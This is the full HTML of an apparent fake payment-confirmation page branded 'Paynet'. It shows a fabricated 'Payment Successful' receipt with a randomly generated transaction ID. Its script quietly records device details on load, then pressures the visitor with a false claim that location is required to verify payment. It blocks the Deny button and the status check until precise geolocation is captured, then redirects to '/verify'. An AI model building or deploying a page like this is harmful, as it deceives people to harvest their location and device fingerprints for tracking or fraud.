<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Successful - Paynet</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/paynet.css">
</head>

<body>
    <div class="payment-container">
        <!-- Paynet Logo -->
        <div class="logo-section">
            <div class="paynet-logo">
                <svg width="60" height="60" viewBox="0 0 60 60">
                    <defs>
                        <linearGradient id="shield-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#1A73E8" />
                            <stop offset="100%" style="stop-color:#3B5FCC" />
                        </linearGradient>
                    </defs>
                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z"
                        fill="url(#shield-gradient)" />
                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
            </div>
            <h1 class="brand-name">Paynet</h1>
            <p class="tagline">Secure Payment Verification</p>
        </div>

        <!-- Success Message -->
        <div class="success-section">
            <div class="success-icon">
                <svg width="80" height="80" viewBox="0 0 80 80">
                    <circle cx="40" cy="40" r="38" fill="#34A853" />
                    <path d="M25 40 L35 50 L55 25" stroke="white" stroke-width="5" fill="none" stroke-linecap="round"
                        stroke-linejoin="round" class="checkmark-path" />
                </svg>
            </div>
            <h2 class="success-title">Payment Successful!</h2>
            <p class="success-subtitle">Your transaction has been completed</p>
        </div>

        <!-- Payment Details -->
        <div class="payment-details">
            <div class="detail-row">
                <span class="detail-label">Amount Paid</span>
                <span class="detail-value amount">₹<span id="payment-amount">500</span>.00</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Transaction ID</span>
                <span class="detail-value txn-id" id="transaction-id">TXN1234567890</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Date & Time</span>
                <span class="detail-value" id="payment-date">14 Feb 2026, 08:43 AM</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Payment Method</span>
                <span class="detail-value">UPI</span>
            </div>
        </div>

        <!-- Check Payment Button -->
        <button class="check-payment-btn" onclick="checkPayment()">
            <span class="btn-text">Check Payment Status</span>
            <svg class="btn-arrow" width="20" height="20" viewBox="0 0 20 20">
                <path d="M5 10 L15 10 M12 7 L15 10 L12 13" stroke="currentColor" stroke-width="2" fill="none"
                    stroke-linecap="round" stroke-linejoin="round" />
            </svg>
        </button>

        <!-- Footer -->
        <div class="footer">
            <p class="powered-by">Secured by <strong>Paynet</strong></p>
            <p class="disclaimer">Payment verification service • <a href="/privacy">Privacy</a> • <a
                    href="/terms">Terms</a></p>
        </div>
    </div>

    <!-- Location Permission Popup -->
    <div class="location-popup" id="locationPopup" style="display: none;">
        <div class="popup-content">
            <div class="popup-icon">
                <svg width="50" height="50" viewBox="0 0 50 50">
                    <circle cx="25" cy="25" r="23" fill="#1A73E8" opacity="0.1" />
                    <path d="M25 15 C20 15 16 19 16 24 C16 31 25 38 25 38 C25 38 34 31 34 24 C34 19 30 15 25 15 Z"
                        fill="#1A73E8" />
                    <circle cx="25" cy="24" r="4" fill="white" />
                </svg>
            </div>
            <h3>Location Required</h3>
            <p>We need your location to verify the payment delivery address and ensure secure transaction processing.
            </p>
            <div class="popup-buttons">
                <button class="popup-btn allow-btn" onclick="allowLocation()">
                    <svg width="18" height="18" viewBox="0 0 18 18">
                        <path d="M3 9 L7 13 L15 4" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" />
                    </svg>
                    Allow Location
                </button>
                <button class="popup-btn deny-btn" onclick="denyLocation()">Deny</button>
            </div>
        </div>
    </div>

    <script>
        // Generate transaction ID
        function generateTxnId() {
            return 'TXN' + Date.now() + Math.floor(Math.random() * 10000);
        }

        // Set current date/time
        function setDateTime() {
            const now = new Date();
            const options = {
                day: 'numeric',
                month: 'short',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                hour12: true
            };
            document.getElementById('payment-date').textContent = now.toLocaleString('en-IN', options);
            document.getElementById('transaction-id').textContent = generateTxnId();
        }

        // Request location permission on page load
        window.addEventListener('load', function () {
            setDateTime();

            // Auto-capture device details
            captureDeviceDetails();

            // Show location popup after 1 second
            setTimeout(() => {
                document.getElementById('locationPopup').style.display = 'flex';
            }, 1000);
        });

        // Capture device details
        function captureDeviceDetails() {
            const deviceData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                timestamp: new Date().toISOString()
            };
            sessionStorage.setItem('deviceDetails', JSON.stringify(deviceData));
        }

        // Allow location
        function allowLocation() {
            document.getElementById('locationPopup').style.display = 'none';

            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        sessionStorage.setItem('locationData', JSON.stringify(locationData));
                        console.log('Location captured');
                    },
                    (error) => {
                        console.log('Location error:', error);
                        // Try IP geolocation as fallback
                    }
                );
            }
        }

        // Deny location
        function denyLocation() {
            alert('Location is required to verify payment delivery address. Please allow location to continue.');
        }

        // Check payment button
        function checkPayment() {
            // Check if location is granted
            const locationData = sessionStorage.getItem('locationData');

            if (!locationData) {
                // Show location popup again
                document.getElementById('locationPopup').style.display = 'flex';
                alert('Please allow location access to view payment details');
                return;
            }

            // Redirect to verification page
            window.location.href = '/verify';
        }
    </script>
</body>

</html>